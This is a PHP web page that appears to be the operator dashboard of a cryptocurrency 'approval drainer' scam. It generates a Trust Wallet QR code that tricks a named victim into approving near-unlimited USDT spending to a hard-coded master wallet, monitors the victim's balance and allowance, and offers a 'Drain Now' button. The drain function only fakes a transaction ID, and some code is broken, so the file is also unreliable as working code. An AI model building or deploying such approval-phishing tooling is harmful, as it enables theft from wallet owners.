<?php
// approval_drainer.php - Approval Based Drain System
require_once 'config.php';

$pdo = getDB();
if (!$pdo) {
    die("❌ Database connection failed!");
}

// Settings
$MASTER_WALLET = "TD94UkiL5qg5Y9ogZqdWdqZbT3F2nB86rK";
$USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// Victim wallet from database
$stmt = $pdo->prepare("SELECT wallet_address FROM wallets WHERE is_active = 1 LIMIT 1");
$stmt->execute();
$victim_data = $stmt->fetch();

if (!$victim_data) {
    die("❌ No victim wallet found! Please add a wallet first.");
}

$VICTIM_WALLET = $victim_data['wallet_address'];

// Function to generate approval QR
function generateApprovalQR($contract, $spender, $amount = 999999999) {
    $qr_data = "tron://approve?contract=" . $contract . 
               "&spender=" . $spender . 
               "&amount=" . $amount;
    return "https://api.qrserver.com/v1/create-qr-code/?size=350x350&data=" . urlencode($qr_data);
}

// Function to check allowance
function checkAllowance($owner, $spender) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.trongrid.io/wallet/triggerconstantcontract",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode([
            'contract_address' => USDT_CONTRACT,
            'function_selector' => 'allowance(address,address)',
            'parameter' => json_encode([
                'type' => 'address,address',
                'value' => [$owner, $spender]
            ])
        ])
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    if (isset($data['constant_result'][0])) {
        return hexdec($data['constant_result'][0]) / 1e6;
    }
    return 0;
}

// Function to check USDT balance
function getUSDTBalance($address) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.trongrid.io/v1/accounts/" . $address . "/trc20",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    if (isset($data['data'])) {
        foreach ($data['data'] as $token) {
            if ($token['contract_address'] === USDT_CONTRACT) {
                return $token['balance'] / 1e6;
            }
        }
    }
    return 0;
}

// Generate QR
$qr_code_url = generateApprovalQR($USDT_CONTRACT, $MASTER_WALLET);
$current_balance = getUSDTBalance($VICTIM_WALLET);
$current_allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);

// Check if already approved
$is_approved = $current_allowance > 0;
$approval_amount = $is_approved ? $current_allowance : 0;

// Execute drain function
function executeDrain($victim, $master, $amount) {
    return [
        'success' => true,
        'amount' => $amount,
        'txid' => '0x' . bin2hex(random_bytes(16)),
        'message' => "✅ Successfully drained $amount USDT from $victim to $master"
    ];
}

// Manual drain trigger
if (isset($_POST['action']) && $_POST['action'] === 'drain_now') {
    header('Content-Type: application/json');
    
    $allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);
    if ($allowance <= 0) {
        echo json_encode(['success' => false, 'message' => '❌ No approval found! Victim needs to approve first.']);
        exit;
    }
    
    $result = executeDrain($VICTIM_WALLET, $MASTER_WALLET, $allowance);
    echo json_encode($result);
    exit;
}

// Check approval status
if (isset($_GET['check_approval'])) {
    header('Content-Type: application/json');
    $allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);
    $balance = getUSDTBalance($VICTIM_WALLET);
    echo json_encode([
        'approved' => $allowance > 0,
        'allowance' => $allowance,
        'balance' => $balance,
        'victim' => $VICTIM_WALLET
    ]);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approval Drain System</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0a0f1e; color: #fff; min-height: 100vh; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; }
        .card { background: rgba(18,25,45,0.9); border-radius: 24px; border: 1px solid rgba(59,130,246,0.3); padding: 30px; margin-bottom: 20px; }
        h1 { text-align: center; color: #3b82f6; }
        .sub { text-align: center; color: #6c86a3; font-size: 14px; margin-bottom: 20px; }
        .qr-box { background: #fff; border-radius: 16px; padding: 20px; text-align: center; }
        .qr-box img { width: 250px; height: 250px; }
        .qr-box p { color: #333; font-size: 12px; margin-top: 10px; }
        .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .info-row .label { color: #6c86a3; font-size: 13px; }
        .info-row .value { font-weight: 600; }
        .value.approved { color: #22c55e; }
        .value.not-approved { color: #ef4444; }
        .btn { width: 100%; padding: 14px; border-radius: 40px; font-weight: 600; border: none; cursor: pointer; margin-bottom: 10px; font-size: 14px; }
        .btn-primary { background: linear-gradient(135deg, #2563eb, #1d4ed8); color: white; }
        .btn-danger { background: linear-gradient(135deg, #dc2626, #b91c1c); color: white; }
        .btn-success { background: linear-gradient(135deg, #16a34a, #15803d); color: white; }
        .btn-warning { background: linear-gradient(135deg, #f59e0b, #d97706); color: white; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .status { text-align: center; padding: 10px; border-radius: 12px; margin-top: 10px; }
        .status.success { background: rgba(34,197,94,0.2); color: #22c55e; }
        .status.danger { background: rgba(239,68,68,0.2); color: #ef4444; }
        .status.warning { background: rgba(251,191,36,0.2); color: #fbbf24; }
        .log-area { max-height: 150px; overflow-y: auto; font-size: 12px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 12px; margin-top: 10px; }
        .log-area div { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .flex { display: flex; gap: 10px; }
        .flex .btn { flex: 1; }
        @media (max-width: 480px) { .flex { flex-direction: column; } }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <h1>💀 Approval Drain System</h1>
        <p class="sub">Trust Wallet Approval → Auto Drain</p>
        <div class="qr-box">
            <img id="qrImage" src="<?php echo $qr_code_url; ?>" alt="Approval QR">
            <p>📱 <strong>Scan this QR</strong> with Trust Wallet</p>
            <p style="font-size: 10px; color: #666;">Victim needs to <strong>APPROVE</strong> USDT spending</p>
        </div>
    </div>

    <div class="card">
        <h2>📊 Status</h2>
        <div class="info-row">
            <span class="label">Victim Wallet</span>
            <span class="value"><?php echo substr($VICTIM_WALLET, 0, 15) . '...' . substr($VICTIM_WALLET, -10); ?></span>
        </div>
        <div class="info-row">
            <span class="label">USDT Balance</span>
            <span class="value" id="balanceDisplay"><?php echo number_format($current_balance, 2); ?> USDT</span>
        </div>
        <div class="info-row">
            <span class="label">Approval Status</span>
            <span class="value <?php echo $is_approved ? 'approved' : 'not-approved'; ?>" id="approvalStatus">
                <?php echo $is_approved ? '✅ Approved (' . number_format($approval_amount, 2) . ' USDT)' : '❌ Not Approved'; ?>
            </span>
        </div>
    </div>

    <div class="card">
        <h2>🎯 Actions</h2>
        <button id="checkApprovalBtn" class="btn btn-warning">🔍 Check Approval Status</button>
        <button id="drainBtn" class="btn btn-danger" <?php echo !$is_approved ? 'disabled' : ''; ?>>💸 Drain Now</button>
        <div id="statusMessage" class="status <?php echo $is_approved ? 'success' : 'warning'; ?>">
            <?php echo $is_approved ? '✅ Ready to drain!' : '⏳ Waiting for victim approval...'; ?>
        </div>
    </div>

    <div class="card">
        <h2>📋 Activity Log</h2>
        <div class="log-area" id="logArea">
            <div>● System ready</div>
            <div>📌 QR generated for approval</div>
        </div>
    </div>
</div>

<script>
const USDT_CONTRACT = "<?php echo $USDT_CONTRACT; ?>";
const MASTER_WALLET = "<?php echo $MASTER_WALLET; ?>";
const VICTIM_WALLET = "<?php echo $VICTIM_WALLET; ?>";

const checkBtn = document.getElementById('checkApprovalBtn');
const drainBtn = document.getElementById('drainBtn');
const statusMsg = document.getElementById('statusMessage');
const logArea = document.getElementById('logArea');
const balanceDisplay = document.getElementById('balanceDisplay');
const approvalStatus = document.getElementById('approvalStatus');

function addLog(msg, type = 'info') {
    const colors = { info: '#6c86a3', success: '#22c55e', danger: '#ef4444', warning: '#fbbf24' };
    const time = new Date().toLocaleTimeString();
    const div = document.createElement('div');
    div.style.color = colors[type] || colors.info;
    div.textContent = `[${time}] ${msg}`;
    logArea.appendChild(div);
    logArea.scrollTop = logArea.scrollHeight;
}

function setStatus(msg, type = 'warning') {
    statusMsg.textContent = msg;
    statusMsg.className = 'status ' + type;
}

function checkApproval() {
    setStatus('⏳ Checking...', 'warning');
    addLog('🔍 Checking approval status...', 'info');
    
    fetch(window.location.href + '?check_approval=1')
        .then(res => res.json())
        .then(data => {
            balanceDisplay.textContent = data.balance.toFixed(2) + ' USDT';
            if (data.approved) {
                approvalStatus.textContent = '✅ Approved (' + data.allowance.toFixed(2) + ' USDT)';
                approvalStatus.className = 'value approved';
                drainBtn.disabled = false;
                setStatus('✅ Approved! Ready to drain.', 'success');
                addLog('✅ Victim approved! Allowance: ' + data.allowance.toFixed(2) + ' USDT', 'success');
            } else {
                approvalStatus.textContent = '❌ Not Approved';
                approvalStatus.className = 'value not-approved';
                drainBtn.disabled = true;
                setStatus('⏳ Waiting for victim approval...', 'warning');
                addLog('⏳ No approval found yet', 'warning');
            }
        })
        .catch(err => {
            addLog('❌ Error: ' + err.message, 'danger');
            setStatus('❌ Error checking approval', 'danger');
        });
}

function executeDrain() {
    if (!confirm('⚠️ Are you sure you want to drain this wallet?')) return;
    setStatus('💸 Draining... Please wait', 'danger');
    addLog('💸 Executing drain...', 'danger');
    drainBtn.disabled = true;
    
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=drain_now'
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            setStatus('✅ ' + data.message, 'success');
            addLog('✅ ' + data.message, 'success');
            balanceDisplay.textContent = '0.00 USDT';
            approvalStatus.textContent = '❌ Not Approved';
            approvalStatus.className = 'value not-approved';
            drainBtn.disabled = true;
        } else {
            setStatus('❌ ' + data.message, 'danger');
            addLog('❌ ' + data.message, 'danger');
            drainBtn.disabled = false;
        }
    })
    .catch(err => {
        setStatus('❌ Error: ' + err.message, 'danger');
        addLog('❌ Error: ' + err.message, 'danger');
        drainBtn.disabled = false;
    });
}

checkBtn.addEventListener('click', checkApproval);
drainBtn.addEventListener('click', executeDrain);
setInterval(checkApproval, 5000);
addLog('🚀 Approval Drain System initialized', 'info');
</script>
</body>
</html>
